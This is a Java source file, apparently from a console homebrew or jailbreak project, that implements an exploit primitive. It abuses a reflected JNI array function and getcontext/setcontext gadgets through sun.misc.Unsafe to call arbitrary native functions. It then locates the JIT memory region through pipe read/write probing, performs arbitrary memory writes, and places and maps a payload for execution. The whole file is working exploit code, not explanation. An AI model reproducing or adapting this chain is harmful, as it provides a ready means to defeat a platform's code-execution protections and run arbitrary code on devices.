package org.homebrew;

public class NativeStuff
{
    public static native long multiNewArrayGadget(long arg1, int[] arg2);
    private static boolean gadget_initialized = false;
    private static long mov_eax_45_ret = 0;
    private static long mov_rax_rdi_0x10_ret = 0;
    private static long getcontext = 0;
    private static long setcontext = 0;
    private static long sys_read = 0;
    private static long sys_write = 0;
    private static boolean jit_trained = false;
    private static void init() throws Exception
    {
        if(!gadget_initialized)
        {
            NativeUtils.addSymbol("Java_org_homebrew_NativeStuff_multiNewArrayGadget",
                NativeUtils.dlsym(0, "Java_java_lang_reflect_Array_multiNewArray"));
            gadget_initialized = true;
        }
        if(mov_eax_45_ret == 0)
            mov_eax_45_ret = NativeUtils.dlsym(0x2001, "pthread_switch_add_np");
        if(mov_rax_rdi_0x10_ret == 0)
            mov_rax_rdi_0x10_ret = NativeUtils.dlsym(0x2001, "sceKernelGetEventData");
        if(!jit_trained)
        {
            for(int i = 0; i < 100000; i++)
                callGadget(mov_eax_45_ret, mov_eax_45_ret, new long[7]);
            jit_trained = true;
        }
        if(getcontext == 0)
            getcontext = NativeUtils.dlsym(0x2001, "getcontext");
        if(setcontext == 0)
            setcontext = NativeUtils.dlsym(0x2001, "setcontext");
        if(sys_read == 0)
            sys_read = NativeUtils.dlsym(0x2001, "read");
        if(sys_write == 0)
            sys_write = NativeUtils.dlsym(0x2001, "write");
    }
    private static long callGadget(long func1, long func2, long[] args) throws Exception
    {
        sun.misc.Unsafe U = NativeUtils.getUnsafe();
        long obj1 = U.allocateMemory(8);
        long obj2 = U.allocateMemory(0x70);
        long obj3 = U.allocateMemory(0xc0);
        long obj4 = U.allocateMemory(0xf8);
        long obj5 = U.allocateMemory(0x4d0);
        long obj6 = U.allocateMemory(0x238);
        U.putLong(obj1, obj2);
        U.putLong(obj2+0x68, obj3);
        U.putInt(obj3+0xbc, 1);
        U.putLong(obj3+0x10, obj4);
        U.putLong(obj3+0x20, obj5);
        U.putLong(obj4+0xf0, mov_eax_45_ret); //returns boolean, nonzero means true
        U.putLong(obj4+0x80, mov_rax_rdi_0x10_ret); //obj3 -> obj5
        U.putLong(obj5+0x10, obj6);
        U.putLong(obj6+0x230, func1);
        int[] q = new int[]{1};
        multiNewArrayGadget(obj1, q);
        for(int i = 1; i < 7; i++)
            U.putLong(obj5+0x50+8*i, args[i]);
        U.putLong(obj5+0xf0, args[0]);
        U.putLong(obj5+0x10, obj6); //overwrites sigmask
        U.putLong(obj6+0x230, func2);
        long ans = multiNewArrayGadget(obj1, q);
        if(ans != 0)
            ans = U.getLong(ans);
        return ans;
    }
    public static long callFunction(long func, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) throws Exception
    {
        init();
        long[] arr = new long[]{func, arg1, arg2, arg3, arg4, arg5, arg6};
        return callGadget(getcontext, setcontext, arr);
    }
    private static boolean isNoNameString(long addr) throws Exception
    {
        String needle = "(NoName)";
        for(int i = 0; i < 8; i++)
            if((char)NativeUtils.getUnsafe().getByte(addr+i) != needle.charAt(i))
                return false;
        return true;
    }
    public static void findJitArea(long[] ans) throws Exception
    {
        sun.misc.Unsafe U = NativeUtils.getUnsafe();
        long p = U.allocateMemory(9);
        callFunction(NativeUtils.dlsym(0x2001, "pipe"), p, 0, 0, 0, 0, 0);
        int r = U.getInt(p);
        int w = U.getInt(p+4);
        long jit_start = 0x900000000l;
        while(callFunction(sys_write, w, jit_start, 1, 0, 0, 0) != 1)
            jit_start += 0x4000;
        boolean written = true;
        while(callFunction(sys_read, r, jit_start, 1, 0, 0, 0) == 1)
        {
            jit_start += 0x4000;
            if(callFunction(sys_write, w, jit_start, 1, 0, 0, 0) != 1)
            {
                written = false;
                break;
            }
        }
        if(written)
            callFunction(sys_read, r, p+8, 1, 0, 0, 0);
        long jit_end = jit_start;
        while(callFunction(sys_write, w, jit_end, 1, 0, 0, 0) == 1
           && callFunction(sys_read, r, jit_end, 1, 0, 0, 0) != 1)
        {
            callFunction(sys_read, r, p+8, 1, 0, 0, 0);
            jit_end += 0x4000;
        }
        ans[0] = jit_start;
        ans[1] = jit_end;
    }
    public static void poke0(long ptr, long value) throws Exception
    {
        init();
        sun.misc.Unsafe U = NativeUtils.getUnsafe();
        long buf = U.allocateMemory(0x58);
        for(int i = 0; i < 0x58; i += 8)
            U.putLong(buf+i, 0);
        U.putLong(buf+0x38, ptr-0xa8);
        U.putLong(buf+0x48, value);
        callFunction(sys_write, 18, buf, 0x58, 0, 0, 0);
        callFunction(sys_read, 18, buf, 1, 0, 0, 0);
        U.freeMemory(buf);
    }
    public static void poke(long ptr, long value) throws Exception
    {
        poke0(ptr, value);
        poke0(ptr-32, 0);
    }
    public static long writePayload(byte[] data) throws Exception
    {
        long[] jit_addr = new long[2];
        findJitArea(jit_addr);
        if(jit_addr[1] - jit_addr[0] < data.length + 0x100)
            throw new RuntimeException("jit area too small");
        sun.misc.Unsafe U = NativeUtils.getUnsafe();
        for(long i = jit_addr[1] - data.length - 0x100; i < jit_addr[1]; i++)
            if(U.getByte(i) != 0)
                throw new RuntimeException("jit area for the payload is not empty");
        long buf = U.allocateMemory(data.length + 8);
        for(int i = 0; i < 8; i++)
            U.putByte(buf+i, (byte)0);
        for(int i = 0; i < data.length; i++)
            U.putByte(buf+8+i, data[i]);
        long pld_addr = jit_addr[1] - data.length - 8;
        for(int i = data.length; i >= 0; i -= 8)
            poke(pld_addr + i, U.getLong(buf+i));
        U.freeMemory(buf);
        return pld_addr + 8;
    }
    public static long writePayload2(byte[] text, byte[] data) throws Exception
    {
        long[] p = new long[2];
        findJitArea(p);
        long addr_pld = writePayload(text);
        long offset_pld = addr_pld - p[0];
        long sceKernelJitCreateAliasOfSharedMemory = NativeUtils.dlsym(0x2001, "sceKernelJitCreateAliasOfSharedMemory");
        long mmap = NativeUtils.dlsym(0x2001, "mmap");
        int fd = 0;
        long map = -1;
        long mapAddr = 0xc00000000l - (offset_pld & -0x4000);
        while(fd < 10000 && (map = callFunction(mmap, mapAddr, p[1]-p[0], 5, 1, fd, 0)) == -1)
            fd++;
        if(map != mapAddr)
            throw new RuntimeException("mmap(text) failed");
        map += offset_pld;
        long mapData = callFunction(mmap, map+text.length, data.length, 3, 4098, -1, 0);
        if(mapData != map + text.length)
            throw new RuntimeException("mmap(data) failed");
        sun.misc.Unsafe U = NativeUtils.getUnsafe();
        for(int i = 0; i < data.length; i++)
            U.putByte(mapData+i, data[i]);
        return map;
    }
}
